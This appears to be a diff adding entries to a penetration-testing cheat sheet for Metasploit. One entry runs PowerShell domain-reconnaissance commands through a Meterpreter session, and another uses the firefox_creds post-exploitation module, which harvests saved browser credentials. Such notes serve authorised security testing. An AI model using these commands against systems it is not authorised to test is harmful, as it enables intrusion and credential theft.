@@ -332,6 +332,16 @@ meterpreter > powershell_shell
 PS > 
 ```
 
+### **Powershell Commands from Meterpreter**
+
+* run a powershell command as a "oneshot" from a meterpreter shell
+
+```
+execute -if powershell.exe -a "dir"
+execute -if powershell.exe -a "net group"
+execute -if powershell.exe -a 'net user /domain'
+```
+
 ### **Metasploit imperssonate**
 
 ```
@@ -349,6 +359,14 @@ set LHOST
 set LPORT
 run
 ```
+
+### Firefox Post Exploitation&#x20;
+
+```
+use post/multi/gather/firefox_creds
+```
+
+* can be run as non Administrator or as Admin, registry information gets pulled as Admin
 
 ### Routing
 
